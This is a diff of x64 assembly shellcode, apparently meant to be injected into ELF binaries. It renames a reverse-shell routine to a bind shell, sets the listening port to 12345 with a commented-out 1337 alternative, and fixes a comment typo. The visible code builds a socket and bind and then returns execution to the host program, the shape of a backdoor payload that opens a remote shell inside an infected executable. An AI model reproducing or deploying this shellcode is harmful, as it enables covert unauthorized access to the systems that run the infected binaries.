@@ -1,4 +1,4 @@
-; Shellcode inpired fro https://www.matteomalvica.com/blog/2019/05/18/injecting-shellcode-into-x64-elf-binaries/
+; Shellcode inpired from https://www.matteomalvica.com/blog/2019/05/18/injecting-shellcode-into-x64-elf-binaries/
 ;BITS 64
 
 ;SECTION .text
@@ -26,7 +26,7 @@
 ;On success, the PID of the child process is returned in the parent,
 ;and 0 is returned in the child.
 
-rev_shell:  
+bind_shell:  
 
 ; socket
   xor eax,eax
@@ -46,7 +46,10 @@ rev_shell:
   ; bind
   xor  rax,rax
   push   rax
+;  push 0x3905 # 1337
   push 0x39300102 ; port 12345
+;+  push 0x3905 # 1337
+
   mov  [rsp+1],al
   mov  rsi,rsp
   mov  dl,16
@@ -106,4 +109,3 @@ normal_exec:
   pop rdx
   pop rcx
   pop rax
-
